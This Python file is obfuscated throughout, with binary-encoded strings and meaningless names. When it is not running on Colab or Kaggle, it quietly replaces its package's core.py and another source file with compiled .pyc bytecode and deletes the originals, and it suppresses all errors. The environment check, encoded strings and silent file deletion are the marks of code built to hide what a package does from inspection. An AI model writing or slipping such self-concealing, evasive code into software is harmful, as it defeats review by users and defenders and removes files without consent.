def ____10101010():
    try:
        def __0101010101(binary):
                try: return ''.join(chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8))
                except: return binary
        binary001 =         '010101010101000001000111010111110100'
        binary002 =         '001001000001010011000100111101000011'
        binary003 = '01000101010100000101100101010100010111110100'
        binary004 = '11100101010101010010010111110100110001000101'
        binary005 = '01001110010100100100010101001011010111110100'
        binary006 = '01010100110001000111010001110100000101001011'
        from os import environ, path, listdir, rename, remove
        condition01 = __0101010101(binary001+binary002)[::-1] not in environ
        condition02 = __0101010101(binary003+binary004+binary005+binary006)[::-1] not in environ
        if condition01 and condition02:
            from shutil import move
            dir_path = path.dirname(path.realpath(__file__))
            dir_path = dir_path.replace(__0101010101('01011100'), __0101010101('00101111'))
            dir_path += __0101010101('00101111')
            try:
                binary01 = '01100011011011110111001001100101'
                binary02 = '00101110011100000111100101100011'
                if not path.exists(dir_path+__0101010101(binary01+binary02)):
                    binary03 = '01011111010111110111000001111001'
                    binary04 = '01100011011000010110001101101000'
                    binary05 = '01100101010111110101111100101111'
                    pycache_dir = dir_path+__0101010101(binary03+binary04+binary05)
                    for filename in listdir(pycache_dir):
                        binary06 = '01100011011011110111001001100101'
                        if filename.startswith(__0101010101(binary06)):
                            binary07 = '01100011011011110111001001100101'
                            binary08 = '00101110011100000111100101100011'
                            binary09 =     '0110001101101111011100100110'
                            binary10 =     '0101001011100111000001111001'
                            move(pycache_dir+filename, dir_path+filename)
                            rename(dir_path+filename, dir_path+__0101010101(binary07+binary08))
                            remove(dir_path+__0101010101(binary09+binary10))
                            break
            except: pass
            try:
                binary11 = '0101111101011111001100000011'
                binary12 = '0001001100000011000100110000'
                binary13 = '0011000100110000001100010010'
                binary14 = '1110011100000111100101100011'
                if not path.exists(dir_path+__0101010101(binary11+binary12+binary13+binary14)):
                    binary15 = '01011111010111110111000001111001'
                    binary16 = '01100011011000010110001101101000'
                    binary17 = '01100101010111110101111100101111'
                    pycache_dir = dir_path+__0101010101(binary15+binary16+binary17)
                    for filename in listdir(pycache_dir):
                        binary18 = '0101111101011111001100000011000100110000'
                        binary19 = '0011000100110000001100010011000000110001'
                        if filename.startswith(__0101010101(binary18+binary19)):
                            binary20 = '0101111101011111001100000011'
                            binary21 = '0001001100000011000100110000'
                            binary22 = '0011000100110000001100010010'
                            binary23 = '1110011100000111100101100011'
                            binary24 =   '01011111010111110011000000'
                            binary25 =   '11000100110000001100010011'
                            binary26 =   '00000011000100110000001100'
                            binary27 =   '01001011100111000001111001'
                            move(pycache_dir+filename, dir_path+filename)
                            rename(dir_path+filename, dir_path+__0101010101(binary20+binary21+binary22+binary23))
                            remove(dir_path+__0101010101(binary24+binary25+binary26+binary27))
                            break
            except: pass
    except: pass
____10101010()
